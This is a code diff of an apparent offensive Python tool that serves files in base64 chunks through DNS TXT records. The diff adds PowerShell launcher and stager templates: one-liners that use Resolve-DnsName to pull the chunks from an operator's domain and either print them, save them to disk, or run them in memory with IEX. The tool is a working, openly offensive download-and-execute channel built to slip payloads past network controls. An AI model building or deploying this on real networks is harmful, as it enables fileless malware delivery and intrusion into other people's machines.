@@ -32,9 +32,15 @@ def log(message, msg_type = ''):
 
     print('%s%s %s%s' % (color, prefix, message, reset))
 
-def base64_encode(filepath):
-    with open(filepath, 'rb') as f:
-        return base64.b64encode(f.read())
+def base64_chunks(clear, size):
+    encoded = base64.b64encode(clear)
+
+    # split base64 into chunks of provided size
+    encoded_chunks = []
+    for i in range(0, len(encoded), size):
+        encoded_chunks.append(encoded[i:i + size])
+
+    return encoded_chunks
 
 def signal_handler(signal, frame):
     log('Exiting...')
@@ -43,9 +49,6 @@ def signal_handler(signal, frame):
 def dns_handler(data):
     # only process dns queries
     if data.haslayer(UDP) and data.haslayer(DNS) and data.haslayer(DNSQR):
-        # get access to the global chunks variable from inside the function
-        global chunks
-
         # split packet layers
         ip = data.getlayer(IP)
         udp = data.getlayer(UDP)
@@ -62,25 +65,23 @@ def dns_handler(data):
             # check if hostname match existing file 
             if len(hostname) > 0 and hostname[0] in chunks:
                 
-                # stager response 
-                if len(hostname) == 1:
-                    response = stagers[hostname[0]]['print']
-                    log('Delivering %s stager to %s' % (hostname[0], ip.src), '+')
+                # launcher response (default): file.domain
+                if len(hostname) == 1: hostname.append('print')
 
-                # exec stager response
-                elif len(hostname) == 2 and hostname[1] == 'exec':
-                    response = stagers[hostname[0]]['exec']
-                    log('Delivering %s exec stager to %s' % (hostname[0], ip.src), '+')
+                # launcher response: file.stager.domain
+                if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save']:
+                    response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], hostname[1], args.domain)
+                    log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')
 
-                # save stager response
-                elif len(hostname) == 2 and hostname[1] == 'save':
-                    response = stagers[hostname[0]]['save']
-                    log('Delivering %s save stager to %s' % (hostname[0], ip.src), '+')
+                # stager response: file.stager.i.domain
+                elif len(hostname) == 3 and hostname[2].isdecimal() and int(hostname[2]) > 0 and int(hostname[2]) <= len(stagers[hostname[0]][hostname[1]]):
+                    response = stagers[hostname[0]][hostname[1]][int(hostname[2])-1]
+                    log('Delivering %s %s stager %s/%d to %s' % (hostname[0], hostname[1], int(hostname[2]), len(stagers[hostname[0]][hostname[1]]), ip.src), '+')
 
-                # base64 chunk response
-                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) < len(chunks[hostname[0]]):
-                    response = chunks[hostname[0]][int(hostname[1])]
-                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1])+1, len(chunks[hostname[0]]), ip.src), '+')
+                # base64 chunk response: file.i
+                elif len(hostname) > 1 and hostname[1].isdecimal() and int(hostname[1]) > 0 and int(hostname[1]) <= len(chunks[hostname[0]]):
+                    response = chunks[hostname[0]][int(hostname[1])-1]
+                    log('Delivering %s chunk %s/%d to %s' % (hostname[0], int(hostname[1]), len(chunks[hostname[0]]), ip.src), '+')
 
                 else: return
 
@@ -126,29 +127,28 @@ if __name__ == '__main__':
         for name in files:
             filenames[name] = ''
         break
-    
-    # for each file, sanitize filename compute chunks and generate stagers
+
+    # launcher and stagers template definition
+    launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
+
+    stager_templates = {
+        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
+        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)}))))',
+        'save': '[IO.File]::WriteAllBytes("$(Get-Location)\%s",[System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
+    }
+
+    # for each file, sanitize filename compute chunks and generate stagers (main file processing loop)
     chunks = {}
     stagers = {}
 
-    stager_templates = {
-        'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings})))',
-        'print-1': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings)))',
-        'exec': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings}))))',
-        'exec-1': 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings))))',
-        'save': '[IO.File]::WriteAllBytes("\output\path", [System.Convert]::FromBase64String((0..%d | %% {Resolve-DnsName -type TXT -Name "%s.$_.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings})))',
-        'save-1': '[IO.File]::WriteAllBytes("\output\path", [System.Convert]::FromBase64String((Resolve-DnsName -type TXT -Name "%s.0.%s" | Where-Object Section -eq Answer | Select -ExpandProperty Strings)))'
-    }
-
     for name in filenames:
-
         # sanitize filenames to be hostname-compliant (64 max, 254 fqdn max, [a-z0-9\-])
         sanitized = re.sub(r'[^\x00-\x7F]','', name)        # remove non-ascii chars (see unidecode to replace with nearest ascii char)
         sanitized = sanitized.lower()                       # lower all chars
         sanitized = re.sub('[^a-z0-9\-]', '-', sanitized)   # replace chars outside charset to '-'
         filenames[name] = sanitized
 
-        # compute base64 chunks of files
+        # verify args.size is decimal
         if not args.size.isdecimal():
             log('Incorrect size value for base64 chunks', '-')
             sys.exit(-1)
@@ -156,33 +156,20 @@ if __name__ == '__main__':
         size = int(args.size)
 
         try:
-            # encode file content to base64
-            encoded_file = base64_encode(os.path.join(abspath, name))
-        
-            # split base64 into chunks of provided size (default: 255)
-            encoded_chunks = []
-            for i in range(0, len(encoded_file), size):
-                encoded_chunks.append(encoded_file[i:i + size])
+            # compute base64 chunks of files
+            with open(os.path.join(abspath, name), 'rb') as f: chunks[filenames[name]] = base64_chunks(f.read(), size)
 
-            chunks[filenames[name]] = encoded_chunks
         except:
-            # remove key from dict in case of failure (i.e. file permissions)
+            # remove key from dict in case of failure (e.g. file permissions)
             del filenames[name]
             log('Error computing base64 for %s, file will been ignored' % name, '-')
             break
 
         # generate stagers
         stagers[filenames[name]] = {}
-
-        # select template based on number of chunks 
-        if len(chunks[filenames[name]]) <= 1:
-            stagers[filenames[name]]['print'] = stager_templates['print-1'] % (filenames[name], args.domain)
-            stagers[filenames[name]]['exec'] = stager_templates['exec-1'] % (filenames[name], args.domain)
-            stagers[filenames[name]]['save'] = stager_templates['save-1'] % (filenames[name], args.domain)
-        else:
-            stagers[filenames[name]]['print'] = stager_templates['print'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
-            stagers[filenames[name]]['exec'] = stager_templates['exec'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
-            stagers[filenames[name]]['save'] = stager_templates['save'] % (len(chunks[filenames[name]])-1, filenames[name], args.domain)
+        stagers[filenames[name]]['print'] = base64_chunks(bytearray(stager_templates['print'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+        stagers[filenames[name]]['exec'] = base64_chunks(bytearray(stager_templates['exec'] % (len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
+        stagers[filenames[name]]['save'] = base64_chunks(bytearray(stager_templates['save'] % (name, len(chunks[filenames[name]]), len(chunks[filenames[name]]), filenames[name], args.domain), 'utf-8'), size)
 
         # display file ready for delivery
         log('File "%s" ready for delivery at %s.%s (%d chunks)' % (name, filenames[name], args.domain, len(chunks[filenames[name]])))
